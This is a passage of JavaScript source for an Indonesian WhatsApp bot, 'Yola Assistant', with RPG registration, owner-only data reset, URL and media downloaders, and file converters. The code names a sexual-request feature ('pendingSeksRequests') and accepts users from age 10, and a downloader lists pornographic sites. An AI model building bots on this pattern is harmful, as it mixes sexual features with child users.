                let aiPromptOverride = `Anda adalah Yola Assistant, AI yang sangat membantu, modern, cerdas, dan menjaga kesopan. Jawaban Anda harus ` + '`' + `lengkap` + '`' + `, ` + '`' + `detail` + '`' + `, ` + '`' + `rapi` + '`' + `, terstruktur dengan baik, dan menggunakan bahasa Indonesia yang baik dan benar. Tekankan ` + '`' + `poin-poin penting` + '`' + ` dalam jawaban Anda dengan membungkusnya dalam tanda petik tunggal terbalik (backtick), misalnya ` + '`' + `seperti ini` + '`' + `. Anda bisa menjawab berbagai pertanyaan, termasuk coding dan semua fitur bot ini. Nama Anda adalah Yola Assistant. Bot ini dibuat oleh ThanDz. JANGAN gunakan '||' untuk memisahkan pesan. Hasilkan satu balasan yang koheren.`;

                await callYolaAI(yola, m, questionText, pushname, userRPGData, prefix, reply, imageForAI, imageMimeForAI, aiPromptOverride);
            }
            break;

            case 'resetallrpg': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh mereset semua data RPG.\n────୨ Yola Assistant ৎ────');

                if (!registeredUsers[m.sender]) {
                    registeredUsers[m.sender] = {};
                }
                registeredUsers[m.sender].pending_reset_all_rpg = Date.now();
                saveUsers(m.sender);

                reply('────୨ Yola Assistant ৎ────\n⚠️ *PERINGATAN! Reset Semua Data RPG!* ⚠️\n\nKakak yakin ingin mereset *SEMUA* data RPG pengguna bot? Ini akan menghapus semua profil, guild, party, inventaris, dan progres RPG secara permanen untuk SEMUA pengguna, dan TIDAK bisa dibatalkan!\n\nUntuk melanjutkan, ketik: `.' + 'resetallrpgk`\nUntuk membatalkan, ketik: `.' + 'resetallrpgc`\n────୨ Yola Assistant ৎ────');
            }
            break;

            case 'resetallrpgk': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh mereset semua data RPG.\n────୨ Yola Assistant ৎ────');
                if (!registeredUsers[m.sender]?.pending_reset_all_rpg) {
                    return reply('────୨ Yola Assistant ৎ────\nℹ️ Tidak ada permintaan reset semua data RPG yang tertunda untuk dikonfirmasi.\n────୨ Yola Assistant ৎ────');
                }

                registeredUsers = {};
                guilds = {};
                parties = {};
                pendingTrades = {};
                partyInvites = {};
                pendingProposals = {};
                pendingSeksRequests = {};
                activeDungeons = {};
                activeQuests = {};
                rpgCounter = { lastUserId: 0, lastGuildId: 0, lastPartyId: 0 };
                pendingConfesses = {};

                saveUsers();
                saveGuilds();
                saveParties();
                savePendingTrades();
                savePartyInvites();
                savePendingProposals();
                savePendingSeksRequests();
                saveActiveDungeons();
                saveActiveQuests();
                saveRpgCounter();
                savePendingConfesses();

                registeredUsers = loadConfig(filePaths.USERS_DB_PATH, {});
                if (registeredUsers[m.sender]) {
                    delete registeredUsers[m.sender].pending_reset_all_rpg;
                } else {
                    registeredUsers[m.sender] = {};
                    delete registeredUsers[m.sender].pending_reset_all_rpg;
                }
                saveUsers(m.sender);

                reply('────୨ Yola Assistant ৎ────\n✅ Semua data RPG berhasil direset! Semua petualang kini harus mendaftar ulang.\n────୨ Yola Assistant ৎ────');
            }
            break;

            case 'resetallrpgc': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh membatalkan reset data RPG.\n────୨ Yola Assistant ৎ────');
                if (!registeredUsers[m.sender]?.pending_reset_all_rpg) {
                    return reply('────୨ Yola Assistant ৎ────\nℹ️ Tidak ada permintaan reset semua data RPG yang tertunda untuk dibatalkan.\n────୨ Yola Assistant ৎ────');
                }

                delete registeredUsers[m.sender].pending_reset_all_rpg;
                saveUsers(m.sender);

                reply('────୨ Yola Assistant ৎ────\n👍 Oke! Reset semua data RPG dibatalkan. Fiuh, hampir saja! >_<\n────୨ Yola Assistant ৎ────');
            }
            break;
            
            
            
            case 'get':
            case 'gethtml': {
                if (!isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────');
                if (!text) return reply(`────୨ Yola Assistant ৎ────\n❓ URL-nya mana nih, Kak? Contoh: ${prefix + command} https://example.com\n────୨ Yola Assistant ৎ────`);

                await reply('────୨ Yola Assistant ৎ────\n⏳ Mengambil HTML dari URL... Sebentar yaa!\n────୨ Yola Assistant ৎ────');
                await yola.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

                const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i;
                if (!urlRegex.test(text)) {
                    await yola.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                    return reply('────୨ Yola Assistant ৎ────\n❌ URL tidak valid. Pastikan formatnya benar (misal: `https://example.com`).\n────୨ Yola Assistant ৎ────');
                }

                try {
                    const response = await axios.get(text, { responseType: 'text', timeout: 15000 });
                    if (response.status !== 200) {
                        throw new Error(`Gagal mengambil data dari URL (Status: ${response.status})`);
                    }
                    const htmlContent = response.data;
                    const makeid = crypto.randomBytes(3).toString("hex");

                    if (currentMenuStyle === 'V1') {
                        const interactiveMsg = generateWAMessageFromContent(m.chat, {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2,
                                        ...(defaultContextInfoBuilder(pushname, command).externalAdReply ? {
                                            externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                                        } : {})
                                    },
                                    interactiveMessage: proto.Message.InteractiveMessage.create({
                                        body: proto.Message.InteractiveMessage.Body.create({
                                            text: `Berikut adalah kode HTML dari Yola:\n\n\`\`\`html\n${htmlContent.substring(0, 500)}${htmlContent.length > 500 ? '...\n(Potongan, silakan salin untuk melihat lengkap)' : ''}\n\`\`\``
                                        }),
                                        footer: proto.Message.InteractiveMessage.Footer.create({
                                            text: "Yola Asisten by ThanDz"
                                        }),
                                        header: proto.Message.InteractiveMessage.Header.create({
                                            title: "📋 Kode HTML Dari Yola",
                                            hasMediaAttachment: false
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                            buttons: [{
                                                name: "cta_copy",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "📋 Salin HTML Lengkap",
                                                    id: `copy_code_${makeid}`,
                                                    copy_code: htmlContent
                                                })
                                            }]
                                        })
                                    })
                                }
                            }
                        }, {
                            userJid: m.sender,
                            quoted: m
                        });
                        await yola.relayMessage(m.chat, interactiveMsg.message, {
                            messageId: interactiveMsg.key.id
                        });
                    } else { // V2 style
                        let responseText = `────୨ Yola Assistant ৎ────\n✅ *Kode HTML dari URL ${text}:*\n\n\`\`\`html\n${htmlContent.substring(0, 2000)}\n\`\`\``;
                        if (htmlContent.length > 2000) {
                            responseText += `\n...(HTML terlalu panjang, hanya sebagian yang ditampilkan. Silakan gunakan mode V1 untuk menyalin lengkap.)`;
                        }
                        responseText += `\n────୨ Yola Assistant ৎ────`;
                        await reply(responseText, defaultContextInfoBuilder(pushname, command));
                    }
                    await yola.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

                } catch (e) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Yola gagal mengambil HTML dari URL itu: ${e.message.split('\n')[0]}\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
                }
            }
            break;

            case 'tojs': {
                let content = text;
                if (!content && m.quoted) {
                    const quotedMessage = m.quoted.message;
                    if (quotedMessage) {
                        if (quotedMessage.conversation) {
                            content = quotedMessage.conversation;
                        } else if (quotedMessage.extendedTextMessage?.text) {
                            content = quotedMessage.extendedTextMessage.text;
                        } else if (quotedMessage.imageMessage?.caption) {
                            content = quotedMessage.imageMessage.caption;
                        } else if (quotedMessage.videoMessage?.caption) {
                            content = quotedMessage.videoMessage.caption;
                        } else if (quotedMessage.documentMessage?.caption) {
                            content = quotedMessage.documentMessage.caption;
                        }
                    }
                }
                if (!content) return reply('────୨ Yola Assistant ৎ────\n❓ Kirimkan teks atau reply pesan yang ingin dijadikan file `.js`, Kak!\n────୨ Yola Assistant ৎ────');

                const fileName = 'index.js';
                const filePath = path.join(TMP_DIR, fileName);
                let isSuccess = false;

                try {
                    fs.writeFileSync(filePath, content.trim());
                    await yola.sendMessage(m.chat, {
                        document: {
                            url: filePath
                        },
                        fileName: fileName,
                        mimetype: 'application/javascript',
                        caption: `────୨ Yola Assistant ৎ────\n✅ Ini dia file *${fileName}* Kakak!\n────୨ Yola Assistant ৎ────`
                    }, {
                        quoted: m,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    });
                    isSuccess = true;
                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Gagal membuat file *${fileName}*: ${e.message}\n────୨ Yola Assistant ৎ────`);
                } finally {
                    if (isSuccess) {
                        setTimeout(() => {
                            try {
                                fs.unlinkSync(filePath);
                            } catch {}
                        }, 30000);
                    }
                }
            }
            break;

            case 'tohtml': {
                let content = text;
                if (!content && m.quoted) {
                    const quotedMessage = m.quoted.message;
                    if (quotedMessage) {
                        if (quotedMessage.conversation) {
                            content = quotedMessage.conversation;
                        } else if (quotedMessage.extendedTextMessage?.text) {
                            content = quotedMessage.extendedTextMessage.text;
                        } else if (quotedMessage.imageMessage?.caption) {
                            content = quotedMessage.imageMessage.caption;
                        } else if (quotedMessage.videoMessage?.caption) {
                            content = quotedMessage.videoMessage.caption;
                        } else if (quotedMessage.documentMessage?.caption) {
                            content = quotedMessage.documentMessage.caption;
                        }
                    }
                }
                if (!content) return reply('────୨ Yola Assistant ৎ────\n❓ Kirimkan teks atau reply pesan yang ingin dijadikan file `.html`, Kak!\n────୨ Yola Assistant ৎ────');

                const fileName = 'index.html';
                const filePath = path.join(TMP_DIR, fileName);
                let isSuccess = false;

                try {
                    fs.writeFileSync(filePath, content.trim());
                    await yola.sendMessage(m.chat, {
                        document: {
                            url: filePath
                        },
                        fileName: fileName,
                        mimetype: 'text/html',
                        caption: `────୨ Yola Assistant ৎ────\n✅ Ini dia file *${fileName}* Kakak!\n────୨ Yola Assistant ৎ────`
                    }, {
                        quoted: m,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    });
                    isSuccess = true;
                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Gagal membuat file *${fileName}*: ${e.message}\n────୨ Yola Assistant ৎ────`);
                } finally {
                    if (isSuccess) {
                        setTimeout(() => {
                            try {
                                fs.unlinkSync(filePath);
                            } catch {}
                        }, 30000);
                    }
                }
            }
            break;

            case 'daftar': {
                if (isRegistered) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak sudah terdaftar kok sebagai petualang! Semangat yaa~\n────୨ Yola Assistant ৎ────');
                const parts = text.split('.');
                if (parts.length !== 2 || !parts[0] || !parts[1]) return await reply(`────୨ Yola Assistant ৎ────\nFormatnya gini loh, Kak: ${prefix}daftar NamaLengkap.Usia\nContoh: ${prefix}daftar Yola Chan.17\n────୨ Yola Assistant ৎ────`);
                const nama = parts[0].trim();
                const umurStr = parts[1].trim();
                const umur = parseInt(umurStr);
                if (!nama || nama.length < 3 || nama.length > 20) return reply('────୨ Yola Assistant ৎ────\n❌ Nama petualangnya 3-20 karakter yaa, Kak~\n────୨ Yola Assistant ৎ────');
                if (isNaN(umur) || umur < 10 || umur > 100) return reply('────୨ Yola Assistant ৎ────\n❌ Usianya antara 10-100 tahun yaa, Kak~\n────୨ Yola Assistant ৎ────');
                await yola.sendMessage(m.chat, {
                    react: {
                        text: '📝',
                        key: m.key
                    }
                });

                if (!registeredUsers[m.sender]) {
                    registeredUsers[m.sender] = {};
                }
                registeredUsers[m.sender].registration_pending = {
                    name: nama,
                    age: umur,
                    step: 'role'
                };
                saveUsers(m.sender);

                if (currentMenuStyle === 'V1') {
                    const roleRows = Object.entries(availableRolesData).map(([id, data]) => ({
                        title: `${data.icon || ''} ${capital(data.name)}`,
                        description: data.description,
                        id: `daftar_role_select_${nama}_${umur}_${id}`
                    }));

                    const menuListParams = {
                        title: '📜 Pilih Peran Petualangmu 📜',
                        sections: [{
                            title: 'Peran yang Tersedia Nih:',
                            highlight_label: 'PILIH PERANMU!',
                            rows: roleRows
                        }]
                    };
                    const listButton = {
                        name: 'single_select',
                        buttonParamsJson: JSON.stringify(menuListParams)
                    };

                    const flowMessage = {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `────୨ Yola Assistant ৎ────\n✨ Selamat datang di dunia petualangan, *${nama}* (${umur} thn)! ✨\nSekarang, pilih peranmu yuk:\n────୨ Yola Assistant ৎ────`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: 'Pilih salah satu peran di bawah ini yaa~'
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: 'PENDAFTARAN PETUALANG BARU',
                                    subtitle: 'Langkah 1: Pilih Peranmu!',
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [listButton],
                                    messageParams: {},
                                    messageVersion: 1
                                }),
                                contextInfo: defaultContextInfoBuilder(pushname, command)
                            })
                        }
                    };
                    await yola.relayMessage(m.chat, flowMessage.message, {
                        messageId: `flow_daftar_role_${m.key.id}`
                    });
                } else {
                    let roleOptionsText = Object.entries(availableRolesData).map(([id, data], i) => `\`${id}\`: ${capital(data.name)} - ${data.description}`).join('\n');
                    await reply(`────୨ Yola Assistant ৎ────\n✨ Selamat datang, *${nama}* (${umur} thn)! ✨\n\nSekarang, pilih peranmu dari daftar ini:\n${roleOptionsText}\n\nKetik: *${prefix}pilihrole [id_role]*\n contoh: *${prefix}pilihrole warrior*\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;

            case 'pilihrole': {
                const senderData = registeredUsers[m.sender];
                if (!senderData?.registration_pending?.step || senderData.registration_pending.step !== 'role') return reply('────୨ Yola Assistant ৎ────\n❓ Kakak lagi gak dalam proses pendaftaran pilih peran nih. Mulai dari `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                if (registeredUsers[m.sender]?.rpg) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak sudah terdaftar kok!\n────୨ Yola Assistant ৎ────');

                const selectedRoleId = args[0]?.trim().toLowerCase();
                const roleData = availableRolesData[selectedRoleId];

                if (!roleData) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! ID Peran "\`${selectedRoleId}\`" gak ada di daftar Yola. Coba cek lagi yaa~\n────୨ Yola Assistant ৎ────`);

                const {
                    name,
                    age
                } = senderData.registration_pending;

                let genderOptionsText = genders.map((g, i) => `\`${g}\`: ${capital(g)} ${g === 'pria' ? '♂️' : '♀️'}`).join('\n');
                await reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Peran *${capital(selectedRoleId)}* sudah dipilih! Keren~ ✨\n\nSekarang, pilih gender Kakak ya:\n${genderOptionsText}\n\nKetik: *${prefix}pilihgender [nama_gender]*\n contoh: *${prefix}pilihgender wanita*\n────୨ Yola Assistant ৎ────`);
                registeredUsers[m.sender].registration_pending = {
                    name: name,
                    age: age,
                    role: selectedRoleId,
                    step: 'gender'
                };
                saveUsers(m.sender);
            }
            break;

            case 'handle_daftar_role': {
                const parts = body.split('_');
                if (parts.length < 6 || parts[0] !== 'daftar' || parts[1] !== 'role' || parts[2] !== 'select') {
                    return reply('────୨ Yola Assistant ৎ────\n❌ Aduh, data interaksi perannya salah nih, Kak... Coba ulang from `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                }
                const nama = parts[3];
                const umurStr = parts[4];
                const role = parts[5];
                const umur = parseInt(umurStr);

                if (!nama || isNaN(umur) || !role || !availableRolesData[role]) return reply('────୨ Yola Assistant ৎ────\n❌ Datanya gak valid nih, Kak... Coba ulang from `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                if (registeredUsers[m.sender]?.rpg) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak sudah terdaftar kok. Cek `.profile` saja~.\n────୨ Yola Assistant ৎ────');

                if (!registeredUsers[m.sender]) {
                    registeredUsers[m.sender] = {};
                }
                registeredUsers[m.sender].registration_pending = {
                    name: nama,
                    age: umur,
                    role: role,
                    step: 'gender'
                };
                saveUsers(m.sender);

                if (currentMenuStyle === 'V1') {
                    const genderRows = genders.map(g => ({
                        title: `${capital(g)} ${g === 'pria' ? '♂️' : '♀️'}`,
                        description: `Pilih ini kalau Kakak ${g}.`,
                        id: `daftar_gender_select_${nama}_${umur}_${role}_${g}`
                    }));
                    const genderListParams = {
                        title: '👤 Pilih Gender Karaktermu 👤',
                        sections: [{
                            title: 'Gender',
                            highlight_label: 'PILIHAN GENDER',
                            rows: genderRows
                        }]
                    };
                    const listButtonGender = {
                        name: 'single_select',
                        buttonParamsJson: JSON.stringify(genderListParams)
                    };

                    const flowMessageGender = {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `────୨ Yola Assistant ৎ────\nPeran *${capital(role)}* sudah dipilih! Keren~ ✨\n\nSekarang, pilih gender buat *${nama}* yaa:\n────୨ Yola Assistant ৎ────`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: 'Gender ini bakal ngaruh ke interaksi loh~'
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: 'PENDAFTARAN PETUALANG BARU',
                                    subtitle: 'Langkah 2: Pilih Gendermu!',
                                    hasMediaAttachment: false
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [listButtonGender],
                                    messageParams: {},
                                    messageVersion: 1
                                }),
                                contextInfo: defaultContextInfoBuilder(pushname, command)
                            })
                        }
                    };
                    await yola.relayMessage(m.chat, flowMessageGender.message, {
                        messageId: `flow_daftar_gender_${m.key.id}`
                    });
                } else {
                    let genderOptionsText = genders.map((g, i) => `\`${g}\`: ${capital(g)} ${g === 'pria' ? '♂️' : '♀️'}`).join('\n');
                    await reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Peran *${capital(role)}* sudah dipilih! Keren~ ✨\n\nSekarang, pilih gender Kakak ya:\n${genderOptionsText}\n\nKetik: *${prefix}pilihgender [nama_gender]*\n contoh: *${prefix}pilihgender wanita*\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;

            case 'pilihgender': {
                const senderData = registeredUsers[m.sender];
                if (!senderData?.registration_pending?.step || senderData.registration_pending.step !== 'gender') return reply('────୨ Yola Assistant ৎ────\n❓ Kakak lagi gak dalam proses pendaftaran pilih gender nih. Mulai dari `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                if (registeredUsers[m.sender]?.rpg) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak sudah terdaftar kok!\n────୨ Yola Assistant ৎ────');

                const selectedGender = args[0]?.trim().toLowerCase();
                if (!genders.includes(selectedGender)) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gender "\`${selectedGender}\`" gak valid. Pilih 'pria' atau 'wanita' yaa~\n────୨ Yola Assistant ৎ────`);

                const {
                    name,
                    age,
                    role
                } = senderData.registration_pending;
                if (!name || !age || !role) return reply('────୨ Yola Assistant ৎ────\n❌ Aduh, data pendaftarannya gak lengkap... Coba ulang from `.daftar nama.umur` ya, Kak.\n────୨ Yola Assistant ৎ────');

                delete registeredUsers[m.sender].registration_pending;

                const bonusMessage = initializeUserRPG(m.sender, name, age, role, selectedGender);
                saveUsers(m.sender);
                await sleep(500);

                await reply(`────୨ Yola Assistant ৎ────\n✅ Pendaftaran Berhasil! Yeay! 🎉\n\nSelamat datang di dunia petualangan, *${name}*!\nPeran: *${capital(role)}* ${availableRolesData[role]?.icon || ''}\nGender: *${capital(selectedGender)}* ${selectedGender === 'pria' ? '♂️' : selectedGender === 'wanita' ? '♀️' : ''}\nUsia: *${age}*\n\n${bonusMessage}\n\nYuk, cek profilmu dengan *${prefix}profile* atau lihat menu RPG dengan *${prefix}rpgmenu*! Semangat yaa~ >_<\n────୨ Yola Assistant ৎ────`);
                await yola.sendMessage(m.chat, {
                    react: {
                        text: '🎉',
                        key: m.key
                    }
                });
            }
            break;

            case 'handle_daftar_gender': {
                if (registeredUsers[m.sender]?.rpg) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak sudah terdaftar kok. Cek `.profile` saja~.\n────୨ Yola Assistant ৎ────');

                const parts = body.split('_');
                if (parts.length < 7 || parts[0] !== 'daftar' || parts[1] !== 'gender' || parts[2] !== 'select') {
                    return reply('────୨ Yola Assistant ৎ────\n❌ Aduh, data interaksi gendernya salah nih, Kak... Coba ulang from `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                }
                const nama = parts[3];
                const umurStr = parts[4];
                const role = parts[5];
                const gender = parts[6];
                const umur = parseInt(umurStr);

                if (!nama || isNaN(umur) || !role || !availableRolesData[role] || !genders.includes(gender)) {
                    return reply('────୨ Yola Assistant ৎ────\n❌ Datanya gak valid atau gak lengkap nih, Kak... Coba ulang from `.daftar nama.umur` ya.\n────୨ Yola Assistant ৎ────');
                }

                const bonusMessage = initializeUserRPG(m.sender, nama, umur, role, gender);
                saveUsers(m.sender);
                await sleep(500);

                await reply(`────୨ Yola Assistant ৎ────\n✅ Pendaftaran Berhasil! Yeay! 🎉\n\nSelamat datang di dunia petualangan, *${nama}*!\nPeran: *${capital(role)}* ${availableRolesData[role]?.icon || ''}\nGender: *${capital(gender)}* ${gender === 'pria' ? '♂️' : gender === 'wanita' ? '♀️' : ''}\nUsia: *${umur}*\n\n${bonusMessage}\n\nYuk, cek profilmu dengan *${prefix}profile* atau lihat menu RPG dengan *${prefix}rpgmenu*! Semangat yaa~ >_<\n────୨ Yola Assistant ৎ────`);
                await yola.sendMessage(m.chat, {
                    react: {
                        text: '🎉',
                        key: m.key
                    }
                });
            }
            break;
            case 'mediafire':
            case 'mf': {
                if (!q) return m.reply(`────୨ Yola Assistant ৎ────\nMasukkan link Mediafire-nya!\nContoh: ${prefix + command} https://www.mediafire.com/file/xxx\n────୨ Yola Assistant ৎ────`)
                await reply('────୨ Yola Assistant ৎ────\nTunggu sebentar, sedang diproses...\n────୨ Yola Assistant ৎ────');

                try {
                    const res = await axios.get(`https://api.siputzx.my.id/api/d/mediafire?url=${encodeURIComponent(q)}`)
                    const json = res.data
                    if (!json.status) return reply('────୨ Yola Assistant ৎ────\nGagal mengambil data dari Mediafire.\n────୨ Yola Assistant ৎ────')
                    const {
                        fileName,
                        fileSize,
                        fileType,
                        mimeType,
                        fileExtension,
                        uploadDate,
                        compatibility,
                        description,
                        downloadLink
                    } = json.data
                    let caption = `────୨ Yola Assistant ৎ────\n*「 MEDIAFIRE DOWNLOADER 」*\n\n`
                    caption += `*Nama File:* ${fileName}\n`
                    caption += `*Ukuran:* ${fileSize}\n`
                    caption += `*Tipe:* ${fileType} (${fileExtension})\n`
                    caption += `*Mime:* ${mimeType}\n`
                    caption += `*Kompatibilitas:* ${compatibility}\n`
                    caption += `*Upload Date:* ${uploadDate}\n`
                    caption += `*Deskripsi:* ${description}\n────୨ Yola Assistant ৎ────`
                    await yola.sendMessage(m.chat, {
                        document: {
                            url: downloadLink
                        },
                        fileName,
                        mimetype: mimeType,
                        caption: caption
                    }, {
                        quoted: m,
                         contextInfo: defaultContextInfoBuilder(pushname, command)
                    })
                } catch (err) {
                    reply('────୨ Yola Assistant ৎ────\nTerjadi kesalahan saat memproses link.\n────୨ Yola Assistant ৎ────')
                }
            }
            break;

            case 'cekid': {
                if (!text) return m.reply('────୨ Yola Assistant ৎ────\nKirim link grup atau channel WhatsApp!\n────୨ Yola Assistant ৎ────')

                let resultId = '';
                let resultType = '';

                if (text.includes('chat.whatsapp.com/')) {
                    try {
                        let code = text.split('chat.whatsapp.com/')[1].trim()
                        let res = await yola.groupGetInviteInfo(code)
                        resultId = res.id;
                        resultType = 'Grup';
                    } catch (e) {
                        return m.reply('────୨ Yola Assistant ৎ────\nGagal mendapatkan ID Grup. Pastikan bot tidak diblokir atau link valid.\n────୨ Yola Assistant ৎ────')
                    }
                } else if (text.includes('whatsapp.com/channel/')) {
                    let id = text.split('/channel/')[1].trim()
                    resultId = `${id}@newsletter`;
                    resultType = 'Channel';
                } else {
                    return m.reply('────୨ Yola Assistant ৎ────\nLink tidak valid!\nContoh:\n• https://chat.whatsapp.com/xxxxx\n• https://whatsapp.com/channel/xxxxx\n────୨ Yola Assistant ৎ────')
                }

                let responseText = `────୨ Yola Assistant ৎ────\n✅ *ID ${resultType}:*\n${resultId}\n`;
                let buttonParams = JSON.stringify({
                    display_text: `📋 Salin ID ${resultType}`,
                    id: `copy_id_${makeid}`,
                    copy_code: resultId
                });

                if (currentMenuStyle === 'V1') {
                    let msg = generateWAMessageFromContent(m.chat, {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {},
                                    deviceListMetadataVersion: 2,
                                    externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                                },
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: responseText
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: `Yola Asisten by ThanDz`
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `ID ${resultType} Ditemukan!`,
                                        hasMediaAttachment: false
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [{
                                            name: "cta_copy",
                                            buttonParamsJson: buttonParams
                                        }]
                                    })
                                })
                            }
                        }
                    }, {
                        userJid: m.sender,
                        quoted: m
                    });
                    await yola.relayMessage(m.chat, msg.message, {
                        messageId: msg.key.id
                    });
                } else {
                    await reply(`${responseText}\n────୨ Yola Assistant ৎ────`, defaultContextInfoBuilder(pushname, command));
                }
            }
            break;

            case 'aio': {
                if (!text) return m.reply(`────୨ Yola Assistant ৎ────\nMasukkan URL yang ingin didownload!\nContoh: .aio link nya\n\nSupport Url\n\n- Tiktok,\n- Douyin,\n- Capcut,\n- Threads,\n- Instagram,\n- Facebook,\n- Kuaishou,\n- QQ,\n- Espn,\n- Pinterest,\n- imdb,\n- imgur,\n- ifunny,\n- Izlesene,\n- Reddit,\n- Youtube,\n- Twitter,\n- Vimeo,\n- Snapchat,\n- Bilibili,\n- Dailymotion,\n- Sharechat,\n- Likee,\n- Linkedin,\n- Tumblr,\n- Hipi,\n- Telegram,\n- Getstickerpack,\n- Bitchute,\n- Febspot,\n- 9GAG,\n- oke.ru,\n- Rumble,\n- Streamable,\n- Ted,\n- SohuTv,\n- Pornbox,\n- Xvideos,\n- Xnxx,\n- Kuaishou,\n- Xiaohongshu,\n- Ixigua,\n- Weibo,\n- Miaopai,\n- Meipai,\n- Xiaoying,\n- National Video,\n- Yingke,\n- Sina,\n- Bluesky,\n- Soundcloud,\n- Mixcloud,\n- Spotify,\n- Zingmp3,\n- Bandcamp\n────୨ Yola Assistant ৎ────`);

                try {
                    await reply(`────୨ Yola Assistant ৎ────\n⏳ Memproses AIO downloader... Sebentar yaa!\n────୨ Yola Assistant ৎ────`, defaultContextInfoBuilder(pushname, command));

                    const res = await fetch(`https://r-nozawa.hf.space/aio?url=${encodeURIComponent(text)}`);
                    const json = await res.json();

                    if (json.error == true) return m.reply(`────୨ Yola Assistant ৎ────\nGagal mengambil media: ${json.message || 'URL tidak valid atau tidak didukung.'}\n────୨ Yola Assistant ৎ────`);

                    let mediatype = json.medias[0].type || 'media';
                    let resulturl = json.medias[0].url

                    if (!resulturl) return m.reply('────୨ Yola Assistant ৎ────\nTidak menemukan URL media untuk didownload.\n────୨ Yola Assistant ৎ────');

                    let caption = `────୨ Yola Assistant ৎ────\n*Downloader AIO*\n\n*Judul:* ${json.title || '-'}\n*Source:* ${json.source || '-'}\n*Tipe:* ${mediatype}\n────୨ Yola Assistant ৎ────`;

                    if (mediatype === 'image') {
                        await yola.sendMessage(m.chat, { image: { url: resulturl }, caption }, { quoted: m, contextInfo: defaultContextInfoBuilder(pushname, command) });
                    } else if (mediatype === 'video') {
                        await yola.sendMessage(m.chat, { video: { url: resulturl }, caption }, { quoted: m, contextInfo: defaultContextInfoBuilder(pushname, command) });
                    } else if (mediatype === 'audio') {
                        await yola.sendMessage(m.chat, { audio: { url: resulturl }, mimetype: 'audio/mp4', caption }, { quoted: m, contextInfo: defaultContextInfoBuilder(pushname, command) });
                    } else {
                        await yola.sendMessage(m.chat, { document: { url: resulturl }, fileName: 'result', caption }, { quoted: m, contextInfo: defaultContextInfoBuilder(pushname, command) });
                    }

                } catch (e) {
                    m.reply('────୨ Yola Assistant ৎ────\nTerjadi kesalahan saat memproses permintaan.\n────୨ Yola Assistant ৎ────');
                }
            }
            break;

         /*   case 'play': { 
                const query = args.join(' ');
                if (!query) return reply(`────୨ Yola Assistant ৎ────\nContoh penggunaan: .${command} faded\n────୨ Yola Assistant ৎ────`);

                await yola.sendMessage(m.chat, { react: { text: '🎀', key: m.key } });

                try {
                    const api = `https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(query)}`;
                    const res = await fetch(api);
                    const json = await res.json();
                    if (!json?.status || !json?.result) return reply('────୨ Yola Assistant ৎ────\nGagal mengambil data video.\n────୨ Yola Assistant ৎ────');

                    const {
                        title = 'Tanpa Judul',
                        channel = 'Tidak diketahui',
                        duration = '-',
                        imageUrl = '',
                        link = ''
                    } = json.result.metadata || {};

                    const audioUrl = json.result.downloadUrl;
